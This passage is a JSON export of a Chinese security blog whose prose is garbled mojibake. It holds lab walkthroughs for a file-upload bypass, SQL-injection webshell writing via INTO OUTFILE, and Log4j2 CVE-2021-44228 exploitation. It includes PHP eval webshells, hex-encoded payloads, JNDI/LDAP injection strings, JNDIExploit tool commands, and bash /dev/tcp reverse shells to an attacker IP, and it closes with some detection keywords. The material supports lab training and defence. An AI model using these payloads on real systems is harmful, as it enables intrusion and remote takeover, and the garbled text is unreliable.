éå›¾ç‰‡å’Œå›¾ç‰‡æ–‡ä»¶åï¼Œç½‘ç»œè¯·æ±‚å‘ç”Ÿäº†æ”¹å˜ã€‚è¯´æ˜å¤„ç†çš„æ—¶å€™å°†å›¾ç‰‡å‘å¾€åç«¯è¿›è¡Œäº†åˆ¤æ–­ã€‚æ’é™¤æ˜¯å‰ç«¯JSç»•è¿‡ æ’é™¤ä¸€äº›ç™½åå•ç»•è¿‡çš„æ–¹å¼ å¦å¤–é€šè¿‡æºç çš„åˆ¤æ–­ï¼ŒPHPä½¿ç”¨$_FILESå®ç°ä¸Šä¼ ï¼Œä¸å­˜åœ¨00æˆªæ–­ç»•è¿‡ä¸Šä¼ é™åˆ¶é—®é¢˜ã€‚ 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH.&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; åˆ¤æ–­phpçš„ç‰ˆæœ¬ å¯ä»¥é€šè¿‡pass-01ï¼Œä¸Šä¼ æœ¨é©¬ï¼Œè·å–phpç‰ˆæœ¬ 1&lt;?php eval(@$_POST[&#x27;a&#x27;]); ?&gt; Postæ³¨å…¥ â€‹ å‚è€ƒæ–‡ç« https://cloud.tencent.com/developer/article/1679294 ã€Šä»0åˆ°1 CTFeræˆé•¿ä¹‹è·¯ã€‹ï¼ˆP121 webæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰ æ€è·¯2: 00æˆªæ–­ç»•è¿‡ä¸Šä¼ é™åˆ¶ï¼š 00æˆªæ–­æ˜¯ç»•è¿‡ä¸Šä¼ é™åˆ¶çš„å¸¸è§æ–¹æ³•ï¼Œåœ¨Cè¯­è¨€ä¸­ï¼Œ\\0æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸç¬¦ï¼Œå¦‚æœç”¨æˆ·èƒ½å¤Ÿä¼ å…¥\\0ï¼Œå°±èƒ½å®ç°æˆªæ–­ã€‚ 00æˆªæ–­ç»•è¿‡ä¸Šä¼ é™åˆ¶é€‚ç”¨çš„åœºæ™¯ï¼šåç«¯å…ˆè·å–ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶åï¼Œå¦‚x.php\\00.jpgï¼Œå†æ ¹æ®æ–‡ä»¶åè·å¾—æ–‡ä»¶çš„å®é™…åç¼€jpgï¼›é€šè¿‡åç¼€çš„ç™½åå•æ ¡éªŒåï¼Œæœ€ç»ˆåœ¨ä¿å­˜æ–‡ä»¶æ—¶å‘ç”Ÿæˆªæ–­ï¼Œå®ç°ä¸Šä¼ çš„æ–‡ä»¶ä¸ºx.php PHPçš„åº•å±‚ä»£ç ä¸ºCè¯­è¨€ï¼Œè‡ªç„¶å­˜åœ¨è¿™ç§é—®é¢˜ï¼Œä½†å®é™…PHPä½¿ç”¨$_FILESå®ç°æ–‡ä»¶ä¸Šä¼ æ—¶å¹¶ä¸å­˜åœ¨00æˆªæ–­ç»•è¿‡ä¸Šä¼ é™åˆ¶é—®é¢˜ï¼Œå› ä¸ºPHPåœ¨æ³¨å†Œ$_FILESå…¨å±€å˜é‡æ—¶å·²ç»äº§ç”Ÿäº†æˆªæ–­ã€‚ä¸Šä¼ æ–‡ä»¶åä¸ºx.php\\00.jpgçš„æ–‡ä»¶ï¼Œè€Œæ³¨å†Œåˆ°$_FILES[&#39;name&#39;]çš„å˜é‡å€¼ä¸ºx.phpï¼Œæ ¹æ®è¯¥å€¼å¾—åˆ°çš„åç¼€ä¸ºphpï¼Œå› æ­¤æ— æ³•é€šè¿‡åç¼€çš„ç™½åå•æ ¡éªŒã€‚ ç‰ˆæœ¬é™åˆ¶ï¼šåœ¨jdk7u40ä»¥ä¸‹ç‰ˆæœ¬å­˜åœ¨00æˆªæ–­é—®é¢˜ï¼Œ7u40ä»¥åçš„ç‰ˆæœ¬ï¼Œåœ¨ä¸Šä¼ ã€å†™å…¥æ–‡ä»¶ç­‰æ“ä½œä¸­éƒ½ä¼šè°ƒç”¨Fileçš„isInvaild()æ–¹æ³•åˆ¤æ–­æ–‡ä»¶æ˜¯å¦åˆæ³•ï¼Œå³ä¸å…è®¸æ–‡ä»¶åå«æœ‰\\0ã€‚å¦‚æœæ–‡ä»¶ä¸åˆæ³•ï¼Œå°†æŠ›å‡ºå¼‚å¸¸é€€å‡ºæµç¨‹ã€‚","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"Webå®‰å…¨/æ–‡ä»¶ä¸Šä¼ ","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://gryffinbit.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"author":"Gryffinbit"},{"title":"sqlæ³¨å…¥getshell","slug":"sqlæ³¨å…¥getshell","date":"2022-09-09T09:58:05.000Z","updated":"2024-11-12T06:59:15.000Z","comments":true,"path":"2022/09/09/sqlæ³¨å…¥getshell/","permalink":"https://gryffinbit.top/2022/09/09/sql%E6%B3%A8%E5%85%A5getshell/","excerpt":"","text":"å‰è¨€åœ¨åˆ©ç”¨sqlæ³¨å…¥æ¼æ´åæœŸï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯é€šè¿‡mysqlçš„fileç³»åˆ—å‡½æ•°æ¥è¿›è¡Œè¯»å–æ•æ„Ÿæ–‡ä»¶æˆ–è€…å†™å…¥webshellï¼Œå…¶ä¸­æ¯”è¾ƒå¸¸ç”¨çš„å‡½æ•°æœ‰ä»¥ä¸‹ä¸‰ä¸ª into dumpfile() into outfile() load_file() è¯»å†™æ–‡ä»¶å‡½æ•°è°ƒç”¨çš„é™åˆ¶ã€‚ into outfile select into outfile çš„æ–¹æ³•æ˜¯åªèƒ½å°†æ–‡ä»¶ç”Ÿæˆåœ¨æœåŠ¡å™¨ä¸Šï¼Œè€Œä¸èƒ½ç”Ÿæˆåœ¨å®¢æˆ·ç«¯ä¸Šã€‚å¯ä»¥ä½¿ç”¨ mysql -e &quot;select&quot; &gt; /tmp/file è¿™ç§é‡å®šå‘çš„æ–¹æ³•ï¼Œå°†æ–‡ä»¶ç”Ÿæˆåœ¨å®¢æˆ·ç«¯ä¸Šã€‚ ç”¨æ³•ï¼šç½‘ç«™æ•°æ®åº“ä¸ºmysqlï¼Œåœ¨sqlæ³¨å…¥çš„è¿‡ç¨‹ä¸­å¦‚æœçˆ†å‡ºäº†ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼Œå¸¸è§„æ€è·¯ä¼šå»æŸ¥çœ‹ä¸€ä¸‹mysqlä¸­ç”¨æˆ·æƒé™æ˜¯å¦æœ‰è¯»å†™æƒé™ã€‚æœ‰çš„è¯å¯ä»¥å¯¹ç‰¹å®šç›®å½•è¿›è¡Œå†™å…¥shellã€‚ 1mysql&gt; select &lt;shell&gt; into outfile &#x27;/tmp/test.php&#x27; æœ‰æ—¶ä¼šå†™å…¥å¤±è´¥ï¼Œæ˜¯å› ä¸ºå¯åŠ¨mysqlçš„æ—¶å€™ä½¿ç”¨äº†--secure-file-priv å‚æ•°ã€‚è¿™ä¸ªå‚æ•°çš„ä¸»è¦ç›®çš„å°±æ˜¯é™åˆ¶ load data infile æˆ–è€…select into outfile ä¹‹ç±»æ–‡ä»¶çš„ç›®å½•ä½ç½®ã€‚ ä½¿ç”¨ SELECT @@global.secure_file_priv; æŸ¥çœ‹å½“å‰è®¾ç½®çš„è·¯å¾„ï¼Œé»˜è®¤ä¸º /var/lib/mysql-files å¯ä»¥æŠŠè¿™ä¸ªé€‰é¡¹å…³æ‰ï¼Œç»§ç»­æµ‹è¯•outfileå†™å…¥æ–‡ä»¶æƒé™çš„é—®é¢˜ã€‚åœ¨ /etc/mysql/my.cnf ä¸­å¦‚ä¸‹é…ç½®ï¼Œç„¶åé‡æ–°å¯åŠ¨mysqlæœåŠ¡ 12[mysqld]secure-file-priv = &quot;&quot; load_fileä»å¤–éƒ¨å°†æ•°æ®å¯¼å…¥åˆ°mysqlæœåŠ¡å™¨ã€‚ load data infile ï¼Œåˆ™loadçš„æ–‡ä»¶å¿…é¡»ä½äºmysqlæœåŠ¡å™¨ä¸Šã€‚ load data local infile ï¼Œåˆ™loadçš„æ–‡ä»¶å¿…é¡»åœ¨å®¢æˆ·ç«¯ä¸Šï¼Œè¯¥è¯­å¥å°†ä»å®¢æˆ·ç«¯å°†æ–‡ä»¶è¯»å–å¹¶å‘é€åˆ°æœåŠ¡å™¨ä¸Šã€‚ åˆ©ç”¨outfile getshellselect &quot;contens&quot; into outfile &quot;filename&quot; æ»¡è¶³æ¡ä»¶ æ²¡æœ‰è¿è¡Œåœ¨ secure-file-privæ¨¡å¼ä¸‹ å¯¹webç›®å½•å…·æœ‰è¯»å†™æƒé™ æ²¡æœ‰è¢«è¿‡æ»¤å•åŒå¼•å· çŸ¥é“webçš„ç‰©ç†ç»å¯¹è·¯å¾„ secure-file-priv secure_file_priv å¯ä»¥è®¾ç½®ä¸‰ä¸ªå‚æ•°ï¼šç©ºï¼ŒNULLï¼Œfilepath å‚æ•°è¯´æ˜ï¼š ç©ºå€¼ï¼šè®¾ç½®ä¸ºç©ºæ—¶ï¼Œæ²¡æœ‰è¿›è¡Œå®‰å…¨é…ç½®ï¼Œé‚£ä¹ˆè¿™æ¨¡å¼ä¸‹åº”è¯¥å°±å¯ä»¥å¯¼å‡º webshell NULLï¼šè®¾ç½®æœ¬å‚æ•°å€¼æ—¶ï¼Œæ•°æ®åº“ä¸èƒ½è¿›è¡Œå¯¼å…¥å¯¼å‡º filepathï¼šfilepath æ˜¯å¯¼å…¥å¯¼å‡ºçš„æ–‡ä»¶è·¯å¾„ï¼Œè®¾ç½®è¿™ä¸ªå€¼ï¼Œé‚£ä¹ˆåªèƒ½å¯¼å‡ºæ–‡ä»¶åˆ° filepath çš„è·¯å¾„ã€‚ æ‰€ä»¥éœ€è¦æ»¡è¶³ secure_file_priv ä¸ºç©ºæˆ–è€…ä¸º web è·¯å¾„æ‰å¯ä»¥è¿›è¡Œè¯»å†™æ“ä½œ å¯ä»¥åœ¨ /etc/mysql/my.cnfé…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹secure-file-priv = &quot;&quot; ï¼ˆä¸è¿‡éƒ½æœ‰æƒé™ä¿®æ”¹é…ç½®æ–‡ä»¶äº†ï¼Œè¿˜éœ€è¦è¿™ä¹ˆè´¹åŠ²å†™æœ¨é©¬å—ã€‚ã€‚ï¼‰ 1select &quot;&lt;?php eval($_POST[&#x27;a2u13&#x27;]);?&gt;&quot; INTO OUTFILE &quot;/Application/MAMP/htdocs/mysql_shell.php&quot; sql-labå®æ“ æ³¨å…¥ç‚¹åˆ¤æ–­ 1?id=1â€™)) - - æ—¶é—´ç›²æ³¨æµ‹è¯• 1?id=3&#x27;)) and sleep(5) --+ ä¼šå»¶æ—¶ï¼Œæ‰€ä»¥æ³¨å…¥ç‚¹ä¸º 1&#39;)) Order by åˆ¤æ–­åˆ—æ•° 1?id=1&#x27;)) order by 3 --+ å½“order by 4 çš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥åˆ—æ•°ä¸º3 åœ¨æ­¤ä¹‹å‰éœ€è¦çŸ¥é“ç½‘ç«™çš„ç›®å½•æƒ…å†µ åˆ©ç”¨sql-lab less2 æ‹¿åˆ°ç»å¯¹è·¯å¾„ 1http://localhost:8888/Less-2/?id=-1%20union%20select%201,@@basedir,@@datadir%20--+ 1/var/lib/mysql/ å¯ä»¥æ ¹æ®è·¯å¾„åˆ¤æ–­æ“ä½œç³»ç»Ÿä¸ºLinuxï¼Œåœ¨Linuxä¸‹é»˜è®¤çš„ç½‘ç«™è·¯å¾„ä¸º/var/www/htmlã€‚SQLI-LABS Less-7é¶åœºçš„è·¯å¾„ä¸º/var/www/sqlilabs/Less-7ï¼‰ æ‰€ä»¥oufileæ–‡ä»¶è·¯å¾„ä¸º 1/var/www/sqlilabs/Less-7/test.php ä¸Šä¼ æµ‹è¯•ä¸€ä¸‹ 1?id=1&#x27;)) union select 1,2,database() into outfile &#x27;/var/www/Less-7/1.txt&#x27; --+ èŠ‚é€‰ï¼šğŸ‘‡ ç”±äºç‰ˆæœ¬åŸå› é„™äººä½¿ç”¨çš„æ˜¯5.7.19-0ubuntu0.16.04.1é«˜ç‰ˆæœ¬ï¼Œå®˜æ–¹åŠ äº†å®‰å…¨ç­–ç•¥ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æ›´æ”¹/etc/mysql/mysql.conf.d/mysqld.cnfåœ¨æœ«å°¾å¤„æ·»åŠ secure_file_priv=&quot;/&quot;,æ›´æ”¹åservice mysql restarté‡å¯mysqlæœåŠ¡ã€‚ä¹‹åæˆ‘ä»¬ä»mysqlå‘½ä»¤è¡Œæ¥çœ‹ç­–ç•¥ï¼š 1mysql&gt;show variables like &#x27;%secure%&#x27;; å¤åˆ¶ æˆ‘ä»¬çœ‹åˆ°secure_file_privè¿™é‡Œå·²ç»å˜æˆâ€œ&#x2F;â€ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥å†™å…¥ã€‚ 1/sqli-labs/Less-7/?id=1?id=-1&#x27;)) union select 1,0x3c3f706870206563686f2027636c65616e726f626f74404368616d6435272e706870696e666f28293b203f3e,3 into outfile &quot;/var/www/html/sqli-labs/Less-7/test.php&quot; -- - //è¿™é‡Œæˆ‘ä»¬å†™å…¥åˆ°ç›®å½• å¤åˆ¶ æˆ‘ä»¬æ¥è®¿é—®åˆšå†™å…¥çš„åœ°æ–¹ 1/sqli-labs/Less-7/?id=1?id=-1&#x27;)) union select 1,0x3c3f706870206563686f2027636c65616e726f626f74404368616d6435272e706870696e666f28293b203f3e,3 into outfile &quot;/var/www/html/sqli-labs/Less-7/test.php&quot; -- - å¤åˆ¶ è¿™é‡Œè§£é‡Šä¸‹0x3c3f706870206563686f2027636c65616e726f626f74404368616d6435272e706870696e666f28293b203f3eï¼Œè¿™æ˜¯å¯¹è¯­å¥è¿›è¡Œhexç¼–ç ï¼Œä¸ºäº†é˜²æ­¢å•å¼•å·å†²çªï¼Œè€Œå¯¼è‡´å†™å…¥æ–‡ä»¶å¤±è´¥ã€‚ å‚è€ƒæ–‡ç« https://blog.csdn.net/bnxf00000/article/details/64123549 https://www.jianshu.com/p/bcafd8f3ad8e Mysqlçš„getshellä¸ææƒæ€»ç»“ã€ä½¿ç”¨ log å†™å…¥ Shellã€‘ https://www.freebuf.com/articles/web/334078.html https://www.freebuf.com/vuls/334032.html https://cloud.tencent.com/developer/article/1078125 https://www.freebuf.com/articles/web/274059.html","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"sql","slug":"Webå®‰å…¨/sql","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://gryffinbit.top/tags/sql/"}],"author":"Gryffinbit"},{"title":"Log4j2å¤ç°","slug":"Log4j2å¤ç°","date":"2022-09-01T16:04:03.000Z","updated":"2024-11-12T06:59:29.000Z","comments":true,"path":"2022/09/02/Log4j2å¤ç°/","permalink":"https://gryffinbit.top/2022/09/02/Log4j2%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"æ¼æ´æ–‡æ¡£æ¼æ´æè¿°Apache Log4j2 æ˜¯ä¸€æ¬¾å¼€æºçš„ Java æ—¥å¿—è®°å½•å·¥å…·ï¼Œå¤§é‡çš„ä¸šåŠ¡æ¡†æ¶éƒ½ä½¿ç”¨äº†è¯¥ç»„ä»¶ã€‚å¦‚ï¼šApache Struts2ã€Apache Solrã€Apache Druidã€Apache Flinkç­‰ã€‚æ­¤æ¬¡æ¼æ´æ˜¯ç”¨äº Log4j2 æä¾›çš„ lookup åŠŸèƒ½é€ æˆçš„ï¼Œè¯¥åŠŸèƒ½å…è®¸å¼€å‘è€…é€šè¿‡ä¸€äº›åè®®å»è¯»å–ç›¸åº”ç¯å¢ƒä¸­çš„é…ç½®ã€‚ä½†åœ¨å®ç°çš„è¿‡ç¨‹ä¸­ï¼Œå¹¶æœªå¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œä»è€Œé€ æˆæ¼æ´çš„å‘ç”Ÿã€‚ Apache Log4j2é‡å†™äº†Log4jæ¡†æ¶ï¼Œå¹¶å¼•å…¥äº†å¤§é‡ä¸°å¯Œçš„ç‰¹æ€§ã€‚å¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯è¾“é€çš„ç›®çš„åœ°ä¸ºæ§åˆ¶å°ã€æ–‡ä»¶ã€GUIç»„ä»¶ç­‰ã€‚ æ¼æ´ç¼–å·CVE-2021-44228 CNVD-2021-95914 æ¼æ´ç­‰çº§ä¸¥é‡ å½±å“èŒƒå›´Apache Log4j 2.x &lt; 2.15.0-rc2 æ¼æ´æ‘˜è¦ç”±äºApache Log4j2æŸäº›åŠŸèƒ½å­˜åœ¨é€’å½’è§£æåŠŸèƒ½ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹åˆ«æ„é€ çš„æ•°æ®è¯·æ±‚åŒ…ï¼Œå¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œæ”»å‡»è€…å¯ç›´æ¥æ„é€ æ¶æ„è¯·æ±‚ï¼Œè§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ å½“ç¨‹åºå°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¢«æ—¥å¿—è®°å½•æ—¶ï¼Œå¯è§¦å‘æ­¤æ¼æ´ã€‚åˆ©ç”¨æ­¤æ¼æ´å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚ æ¼æ´åˆ†æ å¯¹äºä¿¡æ¯æ³„éœ²ï¼Œæ³„éœ²çš„æ•°æ®å¦‚ä½•åˆ©ç”¨ã€‚æ€è·¯å¦‚ä¸‹ï¼š è·å–ï¼ˆè·å–æ•°æ®ï¼‰ï¼šåˆ©ç”¨$&#123;&#125;å’Œå…¶ä»–å„ç§Lookup å¸¦å‡ºï¼ˆå›æ˜¾å¸¦å‡ºæ•°æ®ï¼‰ï¼šåˆ©ç”¨dnslogæˆ–ç›´æ¥dnsåè®® æ‰§è¡Œæµç¨‹ POCä½œä¸ºmessageä¼ ç»™Loggerç±»çš„ error ã€ fatal ç­‰ä¸€äº›æ–¹æ³• ç•¥å»ä¸€äº›éå…³é”®æµç¨‹ï¼Œä¼šè¿›å…¥åˆ°MessagePatternConverterç±»formatæ–¹æ³•å¯¹$&#123;å†…å®¹è¿›è¡Œè§£ææ›¿æ¢ è¿›å…¥åˆ°interpolotorç±»çš„lookupæ–¹æ³•ï¼Œç”±å‰ç¼€å€¼jndiè·å–åˆ°jndiLookupç±» æœ€ç»ˆè°ƒç”¨å¯¹åº”çš„lookupæ–¹æ³•å‘èµ·è¯·æ±‚ æµç¨‹åˆ†æMessagePatternConverter.formatä¼šå…ˆåˆ¤æ–­è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«$&#123;ï¼Œå­˜åœ¨çš„è¯ä¼šè¿›å…¥åˆ¤æ–­ã€‚è¯¥æ¼æ´ä¼šå°†$&#123;&#125;ä¸­çš„å†…å®¹å½“ä½œè¡¨è¾¾å¼ï¼Œä»è€Œè¿›è¡Œè¿œç¨‹åŠ è½½ã€‚ï¼ˆå°†LDAPæœåŠ¡å™¨ä¸Šè¯¥åœ°å€ä¸­æ‰€è®°å½•çš„ä¸œè¥¿åŠ è½½åˆ°æœ¬åœ°ï¼Œæ¥è¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢ï¼‰ æ¼æ´é¶åœº1docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln 1docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln 1docker exec -it log4j_vuln_container /bin/bash 1/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh è®¿é—® http://127.0.0.1:8080/webstudy/ å°±å¯ä»¥äº†ï¼Œ postçš„å‚æ•°ä¸ºc æ¼æ´å¤ç° ä¸fastjsonçš„æ¼æ´å¦‚å‡ºä¸€è¾™ï¼Œéœ€è¦ç¼–å†™ä¸€ä¸ªæ¶æ„ç±»ã€‚ å¼¹å‡ºè®¡ç®—å™¨ 12345678910111213141516public class Exploit &#123; public Exploit()&#123; try&#123; // è¦æ‰§è¡Œçš„å‘½ä»¤ String[] commands = &#123;&quot;open&quot;, &quot;/System/Applications/Calculator.app&quot;&#125;; Process pc = Runtime.getRuntime().exec(commands); pc.waitFor(); &#125; catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv) &#123; Exploit e = new Exploit(); &#125;&#125; æ„é€ payload æ„é€ payloadï¼Œpostæäº¤ 1c=$&#123;jndi:ldap://log4j2.ua7wyw.dnslog.cn&#125; dnslogæŸ¥çœ‹ æŸ¥çœ‹javaç‰ˆæœ¬ 1c=$&#123;jndi:ldap://$&#123;java:version&#125;.t0k805.dnslog.cn&#125; åˆ©ç”¨$&#123;æ¥æŸ¥è¯¢javaç‰ˆæœ¬ æ‰§è¡Œå‘½ä»¤ é¡¹ç›®åœ°å€ï¼šhttps://github.com/WhiteHSBG/JNDIExploit åœ¨æœ¬åœ°å…ˆè¦ç”ŸæˆJNDIé“¾æ¥å¹¶å¯åŠ¨åç«¯ç›¸å…³æœåŠ¡ï¼Œæ³¨æ„é˜²ç«å¢™å¼€å¯ç›¸å…³ç«¯å£ï¼Œç”¨çš„æ˜¯https://github.com/WhiteHSBG/JNDIExploit/releases/download/v1.4/JNDIExploit.v1.4.zip 1java -jar /Users/gryffinbit/Documents/Tools/JNDIExploit1.4/JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.0.89 ä¸€äº›å‘ï¼š åˆšå¼€å§‹è¿è¡Œjarçš„æ—¶å€™ï¼ŒçŠ¶æ€æ˜¯æ˜¾ç¤ºä¸¤ä¸ªç«¯å£çš„ç›‘å¬ï¼Œé»˜è®¤å¼€å¯LDAPå’Œhttpçš„ç«¯å£ã€‚å½“åé¢POSTè¯·æ±‚çš„æ—¶å€™ï¼ŒæˆåŠŸåˆ©ç”¨äº†JNDIæ³¨å…¥ï¼Œä¼šæ˜¾ç¤ºæ³¨å…¥æˆåŠŸçš„ä¸€äº›æç¤ºä¿¡æ¯ è™½ç„¶æ˜¯åœ¨æœ¬åœ°å¯åŠ¨çš„ldapæœåŠ¡ï¼Œä½†æ˜¯-içš„ipä¸èƒ½å†™æˆ127.0.0.1ï¼Œè¦æŸ¥è¯¢æœ¬åœ°çš„ipï¼Œæ‰å¯ä»¥ java -jar /Users/gryffinbit/Documents/Tools/JNDIExploit1.4/JNDIExploit-1.4-SNAPSHOT.jar -u æŸ¥çœ‹æ”¯æŒçš„ LDAP æ ¼å¼ã€‚é’ˆå¯¹ä¸åŒçš„ç½‘é¡µæ¡†æ¶å’Œéœ€æ±‚é€‰æ‹©ã€‚ ä¸‹é¢çš„ä¾‹å­ï¼Œåœ¨postè¯·æ±‚é‡Œæ„é€ cmdï¼Œåˆ©ç”¨JNDIæˆåŠŸæ³¨å…¥ï¼Œæ¥è·å¾—å›æ˜¾ï¼Œé‡‡ç”¨çš„LDAPæ˜¯ ldap://0.0.0.0:1389/Basic/TomcatEcho æ„é€ payload ç½‘é¡µå¤„äºhttp://127.0.0.1:8080/webstudy/ ä»£ç†å¼€å¯burpsuiteï¼Œå¼€å¯æŠ“åŒ…ï¼Œç‚¹å‡»hitmeï¼Œå°†è¯¥æ•°æ®åŒ…æŠ“è· æˆåŠŸæŠ“è·æ•°æ®åŒ… å°†åˆšåˆšæŠ“è·çš„æ•°æ®åŒ…ï¼Œé‡æ”¾ ä¿®æ”¹æ•°æ®åŒ…ï¼Œå°†getæ”¹ä¸ºPOSTï¼Œæ„é€ payloadï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ 1234cmd:whoamiContent-Type: application/x-www-form-urlencodedc=$&#123;jndi:ldap://192.168.0.89:1389/TomcatBypass/TomcatEcho&#125; æˆåŠŸå›æ˜¾ åå¼¹ Shell æ„é€ payload 1234cmd: bash -i &gt;&amp; /dev/tcp/10.211.55.2/5555 0&gt;&amp;1Content-Type: application/x-www-form-urlencodedc=$&#123;jndi:ldap://10.211.55.2:1389/Basic/TomcatEcho&#125; æœåŠ¡å™¨ç«¯å¼€å¯ç›‘å¬ 1ncat -lvnp 5555 åœ¨macOSä¸Šæ˜¯ncatå‘½ä»¤ åœ¨Linuxä¸Šæ˜¯ncå‘½ä»¤ netcatæœ‰å¾ˆå¤šç‰ˆæœ¬ï¼Œä¸åŒæ“ä½œç³»ç»Ÿä¸‹é¢çš„ç»†èŠ‚ç”¨æ³•ä¹Ÿä¸åŒï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šhttps://www.sqlsec.com/2019/10/nc.html#%E6%8C%81%E4%B9%85%E7%9B%91%E5%90%AC å¯èƒ½æ”»å‡»å¤±è´¥ï¼Œè¿™æ—¶å€™éœ€è¦å¯¹payloadè¿›è¡Œç¼–ç  å·¥å…· ä½¿ç”¨ JNDI-Injection-Exploit ã€‚ ç¼–ç  å¯¹cmd base64ç¼–ç ï¼ˆæ”¾è¿›payloadé‡Œçš„ï¼‰ 12bash -i &gt;&amp; /dev/tcp/192.168.0.89/7777 0&gt;&amp;1YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuODkvNzc3NyAwPiYx ç›®æ ‡æœºï¼Œä¸»åŠ¨å¯¹æ”»å‡»æœºå‘èµ·è¿æ¥ã€‚æ”»å‡»æœºæ”¶åˆ°ç›®æ ‡æœºshell payload 1java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuODkvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;192.168.0.89&quot; -A æ”»å‡»æœºçš„IP æ”»å‡»æœºå¯åŠ¨ç›‘å¬ï¼Œè·å–shell 1ncat -lvnp 7777 burpsuite é‡æ”¾ï¼Œæ”¹æˆPOSTï¼Œå‚æ•°æ³¨å…¥é€‰æ‹©JNDI-INJECTç”Ÿæˆçš„payload 123Content-Type: application/x-www-form-urlencodedc=$&#123;jndi:ldap://192.168.0.89:1389/yltjam&#125; æ”»å‡»æ’æŸ¥æ—¥å¿—æ’æŸ¥æ”»å‡»è€…åœ¨åˆ©ç”¨å‰é€šå¸¸é‡‡ç”¨dnslogæ–¹å¼è¿›è¡Œæ‰«æã€æ¢æµ‹ï¼Œå¯¹äºå¸¸è§åˆ©ç”¨æ–¹å¼å¯é€šè¿‡åº”ç”¨ç³»ç»ŸæŠ¥é”™æ—¥å¿—ä¸­çš„å…³é”®å­—è¿›è¡Œæ’æŸ¥ 12345javax.naming.CommunicationExceptionjavax.naming.NamingException: problem generating object using object factoryError looking up JNDI resource æµé‡æ’æŸ¥ æ’æŸ¥æ—¥å¿—æˆ–è€…è§£ç åå®Œæ•´çš„è¯·æ±‚æ•°æ®åŒ…ä¸­æ˜¯å¦å­˜åœ¨$&#123;jndi:å…³é”®å­—ã€‚ æ’æŸ¥æ—¥å¿—æ˜¯å¦å­˜åœ¨ç›¸å…³å †æ ˆæŠ¥é”™ï¼Œå †æ ˆé‡Œæ˜¯å¦æœ‰JndiLookupã€ldapURLContextã€getObjectFactoryFromReferenceç­‰ä¸ jndi è°ƒç”¨ç›¸å…³çš„å †æ ˆä¿¡æ¯ã€‚ JNDIæ˜¯ä»€ä¹ˆæ˜¯ä»€ä¹ˆ JNDIæ˜¯ Java å‘½åä¸ç›®å½•æ¥å£ï¼ˆJava Naming and Directory Interfaceï¼‰ æ¥æº 